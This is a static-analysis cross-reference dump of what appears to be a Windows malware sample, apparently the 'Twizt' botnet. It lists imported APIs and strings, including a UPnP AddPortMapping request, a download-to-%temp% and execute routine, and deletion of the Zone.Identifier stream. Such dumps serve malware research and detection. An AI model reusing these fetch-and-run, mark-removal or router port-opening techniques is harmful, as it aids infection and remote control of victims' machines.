reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x409299	0x40f114	import	0x409240	KERNEL32.dll.LeaveCriticalSection
0x4092bb	0x40f110	import	0x4092b0	KERNEL32.dll.InitializeCriticalSection
0x40930a	0x40f118	import	0x4092b0	KERNEL32.dll.CreateFileW
0x40932b	0x40f124	import	0x4092b0	KERNEL32.dll.CreateFileMappingW
0x40934a	0x40f104	import	0x4092b0	KERNEL32.dll.MapViewOfFile
0x40935f	0x40f100	import	0x4092b0	KERNEL32.dll.GetFileSize
0x4093c5	0x40f108	import	0x4092b0	KERNEL32.dll.UnmapViewOfFile
0x4093cf	0x40f128	import	0x4092b0	KERNEL32.dll.CloseHandle
0x4093d9	0x40f128	import	0x4092b0	KERNEL32.dll.CloseHandle
0x409477	0x40ff9c	string	0x409430	twizt)
0x40947c	0x40f0d4	import	0x409430	KERNEL32.dll.lstrlenA
0x409483	0x40ffa4	string	0x409430	twizt)
0x4096b9	0x40ffac	string	0x4096a0	twizt)
0x4096be	0x40f0d4	import	0x4096a0	KERNEL32.dll.lstrlenA
0x4096c5	0x40ffb4	string	0x4096a0	twizt)
0x409df3	0x40f00c	import	0x409de0	ADVAPI32.dll.CryptAcquireContextW
0x409e09	0x40f004	import	0x409de0	ADVAPI32.dll.CryptGenRandom
0x409e15	0x40f008	import	0x409de0	ADVAPI32.dll.CryptReleaseContext
0x40a7e5	0x40f0d4	import	0x40a7d0	KERNEL32.dll.lstrlenA
0x40a872	0x40f1bc	import	0x40a840	USER32.dll.wvsprintfA
0x40a9df	0x40f218	import	0x40a9c0	WS2_32.dll.send
0x40aa92	0x40f0e0	import	0x40aa80	KERNEL32.dll.GetTickCount
0x40aab8	0x40f224	import	0x40aa80	WS2_32.dll.ioctlsocket
0x40aaef	0x40f220	import	0x40aa80	WS2_32.dll.recv
0x40ab04	0x40f0e0	import	0x40aa80	KERNEL32.dll.GetTickCount
0x40ab24	0x40f0e8	import	0x40aa80	KERNEL32.dll.Sleep
0x40ab2a	0x40f0e0	import	0x40aa80	KERNEL32.dll.GetTickCount
0x40ab63	0x40f258	import	0x40ab50	WS2_32.dll.socket
0x40ab95	0x40f24c	import	0x40ab50	WS2_32.dll.htons
0x40abaf	0x40f240	import	0x40ab50	WS2_32.dll.connect
0x40ac4c	0x40f04c	import	0x40ac40	KERNEL32.dll.InterlockedExchangeAdd
0x40ac7b	0x40f050	import	0x40ac40	KERNEL32.dll.InterlockedIncrement
0x40ad6b	0x40f05c	import	0x40ac40	KERNEL32.dll.InterlockedDecrement
0x40adec	0x40f058	import	0x40adc0	KERNEL32.dll.WaitForSingleObject
0x40aecf	0x40f050	import	0x40ae70	KERNEL32.dll.InterlockedIncrement
0x40af02	0x40f05c	import	0x40ae70	KERNEL32.dll.InterlockedDecrement
0x40afef	0x40f058	import	0x40afc0	KERNEL32.dll.WaitForSingleObject
0x40b02e	0x40f110	import	0x40b010	KERNEL32.dll.InitializeCriticalSection
0x40b080	0x40f058	import	0x40b040	KERNEL32.dll.WaitForSingleObject
0x40b099	0x40f128	import	0x40b040	KERNEL32.dll.CloseHandle
0x40b0e4	0x40f120	import	0x40b0c0	KERNEL32.dll.EnterCriticalSection
0x40b13f	0x40f08c	import	0x40b0c0	KERNEL32.dll.CreateThread
0x40b17c	0x40f048	import	0x40b0c0	KERNEL32.dll.GetCurrentProcess
0x40b187	0x40f048	import	0x40b0c0	KERNEL32.dll.GetCurrentProcess
0x40b18e	0x40f034	import	0x40b0c0	KERNEL32.dll.DuplicateHandle
0x40b1a2	0x40f114	import	0x40b0c0	KERNEL32.dll.LeaveCriticalSection
0x40b1b6	0x40f044	import	0x40b1b0	KERNEL32.dll.GetCurrentThread
0x40b1bd	0x40f03c	import	0x40b1b0	KERNEL32.dll.GetThreadPriority
0x40b1c8	0x40f044	import	0x40b1b0	KERNEL32.dll.GetCurrentThread
0x40b1cf	0x40f040	import	0x40b1b0	KERNEL32.dll.SetThreadPriority
0x40b1f2	0x40f04c	import	0x40b1b0	KERNEL32.dll.InterlockedExchangeAdd
0x40b227	0x40f120	import	0x40b1b0	KERNEL32.dll.EnterCriticalSection
0x40b272	0x40f058	import	0x40b1b0	KERNEL32.dll.WaitForSingleObject
0x40b28e	0x40f114	import	0x40b1b0	KERNEL32.dll.LeaveCriticalSection
0x40b2be	0x40f0e8	import	0x40b1b0	KERNEL32.dll.Sleep
0x40b2cd	0x40f044	import	0x40b1b0	KERNEL32.dll.GetCurrentThread
0x40b2d4	0x40f040	import	0x40b1b0	KERNEL32.dll.SetThreadPriority
0x40b309	0x40f120	import	0x40b2f0	KERNEL32.dll.EnterCriticalSection
0x40b338	0x40f128	import	0x40b2f0	KERNEL32.dll.CloseHandle
0x40b347	0x40f114	import	0x40b2f0	KERNEL32.dll.LeaveCriticalSection
0x40b354	0x40f038	import	0x40b2f0	KERNEL32.dll.DeleteCriticalSection
0x40b38a	0x40f2b4	import	0x40b380	ntdll.dll.NtQuerySystemTime
0x40b398	0x40f2b0	import	0x40b380	ntdll.dll.RtlTimeToSecondsSince1980
0x40b45e	0x40f04c	import	0x40b430	KERNEL32.dll.InterlockedExchangeAdd
0x40b4a8	0x40f058	import	0x40b430	KERNEL32.dll.WaitForSingleObject
0x40b4f6	0x40b511	string	0x40b4d0	_^[]
0x40b500	0x40f058	import	0x40b4d0	KERNEL32.dll.WaitForSingleObject
0x40b54e	0x40f150	import	0x40b520	OLEAUT32.dll.SysReAllocString
0x40b576	0x40f2dc	import	0x40b520	ole32.dll.CoCreateInstance
0x40b611	0x40f14c	import	0x40b520	OLEAUT32.dll.SysStringLen
0x40b6db	0x40f0c0	import	0x40b630	KERNEL32.dll.lstrcmpiW
0x40b6ef	0x40f14c	import	0x40b630	OLEAUT32.dll.SysStringLen
0x40b7f8	0x40f200	import	0x40b780	WININET.dll.InternetCrackUrlA
0x40b808	0x40f1ec	import	0x40b780	WININET.dll.InternetOpenA
0x40b841	0x40f1fc	import	0x40b780	WININET.dll.InternetConnectA
0x40b877	0x40f1f8	import	0x40b780	WININET.dll.HttpOpenRequestA
0x40b89f	0x40f1f0	import	0x40b780	WININET.dll.HttpSendRequestA
0x40b8e8	0x40f1dc	import	0x40b780	WININET.dll.InternetReadFile
0x40b977	0x40f1e8	import	0x40b780	WININET.dll.InternetCloseHandle
0x40b984	0x40f1e8	import	0x40b780	WININET.dll.InternetCloseHandle
0x40b991	0x40f1e8	import	0x40b780	WININET.dll.InternetCloseHandle
0x40b9fe	0x40f208	import	0x40b9b0	WS2_32.dll.recvfrom
0x40ba0e	0x40f0e8	import	0x40b9b0	KERNEL32.dll.Sleep
0x40ba1f	0x40f4d0	string	0x40b9b0	HTTP/1.1 200 OK
0x40ba2b	0x40f17c	import	0x40b9b0	SHLWAPI.dll.StrCmpNIA
0x40ba35	0x40f4e0	string	0x40b9b0	LOCATION:
0x40ba41	0x40f174	import	0x40b9b0	SHLWAPI.dll.StrStrIA
0x40ba6e	0x40f178	import	0x40b9b0	SHLWAPI.dll.StrChrA
0x40baba	0x40f258	import	0x40baa0	WS2_32.dll.socket
0x40baf0	0x40f24c	import	0x40baa0	WS2_32.dll.htons
0x40bafa	0x40f4ec	string	0x40baa0	239.255.255.250
0x40baff	0x40f248	import	0x40baa0	WS2_32.dll.inet_addr
0x40bb1d	0x40f20c	import	0x40baa0	WS2_32.dll.setsockopt
0x40bb53	0x40f214	import	0x40baa0	WS2_32.dll.bind
0x40bb59	0x40f508	string	0x40baa0	M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
0x40bb6c	0x40f0d4	import	0x40baa0	KERNEL32.dll.lstrlenA
0x40bb7b	0x40f210	import	0x40baa0	WS2_32.dll.sendto
0x40bb95	0x40f224	import	0x40baa0	WS2_32.dll.ioctlsocket
0x40bcd3	0x40f590	string	0x40bc20	service
0x40bcdc	0x40f0c0	import	0x40bc20	KERNEL32.dll.lstrcmpiW
0x40bce6	0x40f5a0	string	0x40bc20	serviceType
0x40bd2b	0x40f0c0	import	0x40bc20	KERNEL32.dll.lstrcmpiW
0x40bd3f	0x40f14c	import	0x40bc20	OLEAUT32.dll.SysStringLen
0x40bd57	0x40f14c	import	0x40bc20	OLEAUT32.dll.SysStringLen
0x40bd8d	0x40f5b8	string	0x40bd80	serviceList
0x40beb3	0x40f5d0	string	0x40be00	device
0x40bebc	0x40f0c0	import	0x40be00	KERNEL32.dll.lstrcmpiW
0x40bec6	0x40f5e0	string	0x40be00	deviceType
0x40bf0b	0x40f0c0	import	0x40be00	KERNEL32.dll.lstrcmpiW
0x40bf1f	0x40f14c	import	0x40be00	OLEAUT32.dll.SysStringLen
0x40bf37	0x40f14c	import	0x40be00	OLEAUT32.dll.SysStringLen
0x40bf6d	0x40f5f8	string	0x40bf60	deviceList
0x40bfed	0x40f610	string	0x40bfe0	urn:schemas-upnp-org:device:InternetGatewayDevice:1
0x40c00b	0x40f678	string	0x40bfe0	urn:schemas-upnp-org:device:WANDevice:1
0x40c029	0x40f6c8	string	0x40bfe0	urn:schemas-upnp-org:device:WANConnectionDevice:1
0x40c047	0x40f768	string	0x40bfe0	urn:schemas-upnp-org:service:WANIPConnection:1
0x40c061	0x40f7c8	string	0x40bfe0	urn:schemas-upnp-org:service:WANPPPConnection:1
0x40c07b	0x40f828	string	0x40bfe0	controlURL
0x40c10d	0x40f840	string	0x40c100	URLBase
0x40c216	0x40f850	string	0x40c150	%S%S
0x40c22b	0x40f14c	import	0x40c150	OLEAUT32.dll.SysStringLen
0x40c235	0x40f14c	import	0x40c150	OLEAUT32.dll.SysStringLen
0x40c2f8	0x40f200	import	0x40c280	WININET.dll.InternetCrackUrlA
0x40c306	0x40f858	string	0x40c280	Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
0x40c30b	0x40f1ec	import	0x40c280	WININET.dll.InternetOpenA
0x40c344	0x40f1fc	import	0x40c280	WININET.dll.InternetConnectA
0x40c36e	0x40f888	string	0x40c280	POST
0x40c37a	0x40f1f8	import	0x40c280	WININET.dll.HttpOpenRequestA
0x40c3a5	0x40f1f4	import	0x40c280	WININET.dll.HttpAddRequestHeadersA
0x40c3ab	0x40f890	string	0x40c280	Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
0x40c3cf	0x40f1f0	import	0x40c280	WININET.dll.HttpSendRequestA
0x40c40e	0x40f1dc	import	0x40c280	WININET.dll.InternetReadFile
0x40c491	0x40f1e8	import	0x40c280	WININET.dll.InternetCloseHandle
0x40c49e	0x40f1e8	import	0x40c280	WININET.dll.InternetCloseHandle
0x40c4ab	0x40f1e8	import	0x40c280	WININET.dll.InternetCloseHandle
0x40c4c6	0x40faa8	string	0x40c4c0	<?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
0x40c509	0x40fd30	string	0x40c4c0	SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
0x40c54a	0x40f2d8	import	0x40c540	ole32.dll.CoInitializeEx
0x40c62f	0x40f030	import	0x40c610	KERNEL32.dll.GetLocaleInfoA
0x40c6f5	0x40f02c	import	0x40c6a0	KERNEL32.dll.CreateProcessW
0x40c705	0x40f0e8	import	0x40c6a0	KERNEL32.dll.Sleep
0x40c719	0x40f34c	string	0x40c6a0	open
0x40c720	0x40f158	import	0x40c6a0	SHELL32.dll.ShellExecuteW
0x40c73a	0x40f0e8	import	0x40c6a0	KERNEL32.dll.Sleep
0x40c759	0x40f0e0	import	0x40c750	KERNEL32.dll.GetTickCount
0x40c77f	0x40f0e8	import	0x40c750	KERNEL32.dll.Sleep
0x40c798	0x40f358	string	0x40c750	%temp%
0x40c79d	0x40f088	import	0x40c750	KERNEL32.dll.ExpandEnvironmentStringsW
0x40c837	0x40f368	string	0x40c750	%s\%d%d.exe
0x40c843	0x40f1a8	import	0x40c750	USER32.dll.wsprintfW
0x40c854	0x40f380	string	0x40c750	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
0x40c859	0x40f1e4	import	0x40c750	WININET.dll.InternetOpenW
0x40c888	0x40f1e0	import	0x40c750	WININET.dll.InternetOpenUrlW
0x40c8b7	0x40f118	import	0x40c750	KERNEL32.dll.CreateFileW
0x40c8ea	0x40f1dc	import	0x40c750	WININET.dll.InternetReadFile
0x40c91b	0x40f10c	import	0x40c750	KERNEL32.dll.WriteFile
0x40c92a	0x40f128	import	0x40c750	KERNEL32.dll.CloseHandle
0x40c937	0x40f468	string	0x40c750	%s:Zone.Identifier
0x40c943	0x40f1a8	import	0x40c750	USER32.dll.wsprintfW
0x40c953	0x40f0b4	import	0x40c750	KERNEL32.dll.DeleteFileW
0x40c975	0x40f0e8	import	0x40c750	KERNEL32.dll.Sleep
0x40c989	0x40f128	import	0x40c750	KERNEL32.dll.CloseHandle
0x40c996	0x40f1e8	import	0x40c750	WININET.dll.InternetCloseHandle
0x40c9a3	0x40f1e8	import	0x40c750	WININET.dll.InternetCloseHandle
0x40c9ae	0x40f0e8	import	0x40c750	KERNEL32.dll.Sleep
0x40c9da	0x40f0e8	import	0x40c750	KERNEL32.dll.Sleep
0x40c9fb	0x40f490	string	0x40c750	%s\%d.exe
0x40ca07	0x40f1a8	import	0x40c750	USER32.dll.wsprintfW
0x40ca34	0x40f4a4	string	0x40c750	%s:Zone.Identifier
0x40ca40	0x40f1a8	import	0x40c750	USER32.dll.wsprintfW
0x40ca50	0x40f0b4	import	0x40c750	KERNEL32.dll.DeleteFileW
0x40caa8	0x40f028	import	0x40ca70	KERNEL32.dll.CreateEventA
0x40cab7	0x40f258	import	0x40ca70	WS2_32.dll.socket
0x40cafa	0x40f24c	import	0x40ca70	WS2_32.dll.htons
0x40cb1c	0x40f20c	import	0x40ca70	WS2_32.dll.setsockopt
0x40cb2d	0x40f214	import	0x40ca70	WS2_32.dll.bind
0x40cb55	0x40f08c	import	0x40ca70	KERNEL32.dll.CreateThread
0x40cbbb	0x40cba8	string	0x40cb70	9\bu\nf
0x40cccb	0x40f224	import	0x40cca0	WS2_32.dll.ioctlsocket
0x40cd38	0x40f208	import	0x40cca0	WS2_32.dll.recvfrom
0x40cd4e	0x40f04c	import	0x40cca0	KERNEL32.dll.InterlockedExchangeAdd
0x40cd6f	0x40f058	import	0x40cca0	KERNEL32.dll.WaitForSingleObject
0x40ce20	0x40f24c	import	0x40cda0	WS2_32.dll.htons
0x40ce48	0x40f210	import	0x40cda0	WS2_32.dll.sendto
0x40ce5d	0x40f04c	import	0x40cda0	KERNEL32.dll.InterlockedExchangeAdd
0x40cee1	0x40f0a8	import	0x40ced0	KERNEL32.dll.SetEvent
0x40ceed	0x40f058	import	0x40ced0	KERNEL32.dll.WaitForSingleObject
0x40cef7	0x40f128	import	0x40ced0	KERNEL32.dll.CloseHandle
0x40cf65	0x40f028	import	0x40cf40	KERNEL32.dll.CreateEventA
0x40cf74	0x40f258	import	0x40cf40	WS2_32.dll.socket
0x40cfb5	0x40f214	import	0x40cf40	WS2_32.dll.bind
0x40cfe1	0x40f08c	import	0x40cf40	KERNEL32.dll.CreateThread
0x40d08a	0x40f120	import	0x40d080	KERNEL32.dll.EnterCriticalSection
0x40d0ac	0x40f114	import	0x40d080	KERNEL32.dll.LeaveCriticalSection
0x40d17a	0x40f120	import	0x40d160	KERNEL32.dll.EnterCriticalSection
0x40d19e	0x40f114	import	0x40d160	KERNEL32.dll.LeaveCriticalSection
0x40d1e7	0x40f270	import	0x40d160	WS2_32.dll.getpeername
0x40d1fb	0x40f0a4	import	0x40d160	KERNEL32.dll.CreateIoCompletionPort
0x40d210	0x40f054	import	0x40d160	KERNEL32.dll.InterlockedExchange
0x40d236	0x40f110	import	0x40d160	KERNEL32.dll.InitializeCriticalSection
0x40d240	0x40f050	import	0x40d160	KERNEL32.dll.InterlockedIncrement
0x40d28f	0x40f050	import	0x40d270	KERNEL32.dll.InterlockedIncrement
0x40d2ca	0x40f120	import	0x40d2b0	KERNEL32.dll.EnterCriticalSection
0x40d2f6	0x40f05c	import	0x40d2b0	KERNEL32.dll.InterlockedDecrement
0x40d30e	0x40f04c	import	0x40d2b0	KERNEL32.dll.InterlockedExchangeAdd
0x40d33c	0x40f050	import	0x40d2b0	KERNEL32.dll.InterlockedIncrement
0x40d34c	0x40f05c	import	0x40d2b0	KERNEL32.dll.InterlockedDecrement
0x40d364	0x40f114	import	0x40d2b0	KERNEL32.dll.LeaveCriticalSection
0x40d36e	0x40f0a8	import	0x40d2b0	KERNEL32.dll.SetEvent
0x40d37b	0x40f070	import	0x40d2b0	KERNEL32.dll.PostQueuedCompletionStatus
0x40d3aa	0x40f128	import	0x40d2b0	KERNEL32.dll.CloseHandle
0x40d3c0	0x40f228	import	0x40d2b0	WS2_32.dll.WSACloseEvent
0x40d3d6	0x40f038	import	0x40d2b0	KERNEL32.dll.DeleteCriticalSection
0x40d460	0x40f120	import	0x40d450	KERNEL32.dll.EnterCriticalSection
0x40d470	0x40f04c	import	0x40d450	KERNEL32.dll.InterlockedExchangeAdd
0x40d47d	0x40f114	import	0x40d450	KERNEL32.dll.LeaveCriticalSection
0x40d4b8	0x40f114	import	0x40d450	KERNEL32.dll.LeaveCriticalSection
0x40d4f6	0x40f04c	import	0x40d4d0	KERNEL32.dll.InterlockedExchangeAdd
0x40d561	0x40f05c	import	0x40d4d0	KERNEL32.dll.InterlockedDecrement
0x40d5dc	0x40f0e0	import	0x40d5d0	KERNEL32.dll.GetTickCount
0x40d5ef	0x40f058	import	0x40d5d0	KERNEL32.dll.WaitForSingleObject
0x40d609	0x40f26c	import	0x40d5d0	WS2_32.dll.WSAWaitForMultipleEvents
0x40d626	0x40f238	import	0x40d5d0	WS2_32.dll.WSAEnumNetworkEvents
0x40d658	0x40f274	import	0x40d5d0	WS2_32.dll.accept
0x40d6a0	0x40f0e0	import	0x40d5d0	KERNEL32.dll.GetTickCount
0x40d6b9	0x40f120	import	0x40d5d0	KERNEL32.dll.EnterCriticalSection
0x40d6da	0x40f114	import	0x40d5d0	KERNEL32.dll.LeaveCriticalSection
0x40d6eb	0x40f114	import	0x40d5d0	KERNEL32.dll.LeaveCriticalSection
0x40d702	0x40f120	import	0x40d5d0	KERNEL32.dll.EnterCriticalSection
0x40d715	0x40f04c	import	0x40d5d0	KERNEL32.dll.InterlockedExchangeAdd
0x40d755	0x40f114	import	0x40d5d0	KERNEL32.dll.LeaveCriticalSection
0x40d75b	0x40f0e0	import	0x40d5d0	KERNEL32.dll.GetTickCount
0x40d76b	0x40f058	import	0x40d5d0	KERNEL32.dll.WaitForSingleObject
0x40d791	0x40f230	import	0x40d790	WS2_32.dll.WSASend
0x40d7c2	0x40f234	import	0x40d790	WS2_32.dll.WSAGetLastError
0x40d7d8	0x40f0e8	import	0x40d790	KERNEL32.dll.Sleep
0x40d8ad	0x40f120	import	0x40d810	KERNEL32.dll.EnterCriticalSection
0x40d8d0	0x40f114	import	0x40d810	KERNEL32.dll.LeaveCriticalSection
0x40d90a	0x40f22c	import	0x40d900	WS2_32.dll.WSARecv
0x40d940	0x40f234	import	0x40d900	WS2_32.dll.WSAGetLastError
0x40d956	0x40f0e8	import	0x40d900	KERNEL32.dll.Sleep
0x40d9bd	0x40f04c	import	0x40d9a0	KERNEL32.dll.InterlockedExchangeAdd
0x40d9eb	0x40f050	import	0x40d9a0	KERNEL32.dll.InterlockedIncrement
0x40d9fd	0x40f05c	import	0x40d9a0	KERNEL32.dll.InterlockedDecrement
0x40da36	0x40f054	import	0x40da10	KERNEL32.dll.InterlockedExchange
0x40da60	0x40f05c	import	0x40da10	KERNEL32.dll.InterlockedDecrement
0x40da73	0x40f05c	import	0x40da10	KERNEL32.dll.InterlockedDecrement
0x40da84	0x40f04c	import	0x40da10	KERNEL32.dll.InterlockedExchangeAdd
0x40db0b	0x40f05c	import	0x40da10	KERNEL32.dll.InterlockedDecrement
0x40db3b	0x40f05c	import	0x40da10	KERNEL32.dll.InterlockedDecrement
0x40dba6	0x40f05c	import	0x40da10	KERNEL32.dll.InterlockedDecrement
0x40dbdc	0x40f20c	import	0x40da10	WS2_32.dll.setsockopt
0x40dbe9	0x40f25c	import	0x40da10	WS2_32.dll.closesocket
0x40dcf3	0x40f06c	import	0x40dcd0	KERNEL32.dll.GetSystemInfo
0x40dd07	0x40f110	import	0x40dcd0	KERNEL32.dll.InitializeCriticalSection
0x40dd15	0x40f028	import	0x40dcd0	KERNEL32.dll.CreateEventA
0x40dd2e	0x40f0a4	import	0x40dcd0	KERNEL32.dll.CreateIoCompletionPort
0x40dd5b	0x40f27c	import	0x40dcd0	WS2_32.dll.WSASocketA
0x40dd81	0x40f20c	import	0x40dcd0	WS2_32.dll.setsockopt
0x40ddb1	0x40f24c	import	0x40dcd0	WS2_32.dll.htons
0x40ddc7	0x40f214	import	0x40dcd0	WS2_32.dll.bind
0x40dddf	0x40f280	import	0x40dcd0	WS2_32.dll.listen
0x40ddea	0x40f278	import	0x40dcd0	WS2_32.dll.WSACreateEvent
0x40ddfe	0x40f264	import	0x40dcd0	WS2_32.dll.WSAEventSelect
0x40de82	0x40f2ec	import	0x40de82	urlmon.dll.URLDownloadToFileW
0x40de88	0x40f2c4	import	0x40de88	ntdll.dll.isalpha
0x40de8e	0x40f2c0	import	0x40de8e	ntdll.dll.isdigit
0x40de94	0x40f2bc	import	0x40de94	ntdll.dll.strstr
0x40de9a	0x40f2a8	import	0x40de9a	ntdll.dll.memmove
0x40dea0	0x40f2ac	import	0x40dea0	ntdll.dll.mbstowcs
0x40dea6	0x40f290	import	0x40dea6	msvcrt.dll._vscprintf
0x40deac	0x40f288	import	0x40deac	msvcrt.dll.rand
0x40deb2	0x40f28c	import	0x40deb2	msvcrt.dll.srand
0x40df79	0x40df9e	string	0x40dec0	]_^[
0x40df87	0x40df9e	string	0x40dec0	]_^[
0x40dfc2	0x40f2d0	import	0x40dfc2	ntdll.dll.memset
0x40dfc8	0x40f2cc	import	0x40dfc8	ntdll.dll._aullshr
0x40dfce	0x40f2c8	import	0x40dfce	ntdll.dll._allshl
0x40dfd4	0x40f298	import	0x40dfd4	ntdll.dll.memcpy
0x40dfda	0x40f29c	import	0x40dfda	ntdll.dll._chkstk
0x40dfe0	0x40f2a0	import	0x40dfe0	ntdll.dll._aulldiv
0x40dff3	0x40e000	string	0x40dfe8	]_^[
0x40e13c	0x40e146	string	0x40e0fd	3҉U\b blocks=Basic Latin,Cyrillic
0x40e2d7	0x40e2cd	string	0x40e0fd	90t\bJ
0x40e320	0x40f2a4	import	0x40e320	ntdll.dll.RtlUnwind
0x40e326	0x40f2b8	import	0x40e326	ntdll.dll.NtQueryVirtualMemory
